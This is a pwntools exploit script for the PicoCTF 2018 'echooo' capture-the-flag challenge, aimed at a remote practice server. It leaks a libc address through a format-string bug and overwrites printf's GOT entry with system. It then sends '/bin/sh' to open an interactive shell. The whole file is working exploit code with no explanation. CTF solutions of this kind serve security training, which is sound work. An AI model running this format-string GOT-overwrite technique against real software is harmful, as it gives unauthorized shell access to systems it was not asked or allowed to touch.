from pwn import *

#context.log_level = 'debug'

#p = process('./PicoCTF_2018_echooo')
p = remote('node4.buuoj.cn', 26883)
elf = ELF('PicoCTF_2018_echooo')
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sn = lambda s : p.send(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)
sl = lambda s : p.sendline(s)
rv = lambda s : p.recv(s)

def debug(s):
	gdb.attach(p, '''
		source ~/pwn/.debug/loadsym.py
		loadsym ~/pwn/.debug/libc-2.27.32.so
	''' + s)


#debug('b *0x804874e')


sla(b'> ', b'%47$p')

libc_base = int(rv(10), 16) - 241 - libc.sym['__libc_start_main']
success('libc_base -> {}'.format(hex(libc_base)))

printf_got = elf.got['printf']
system = libc_base + libc.sym['system']

payload = fmtstr_payload(11, { printf_got : system })

sla(b'> ', payload)

sl('/bin/sh')

p.interactive()
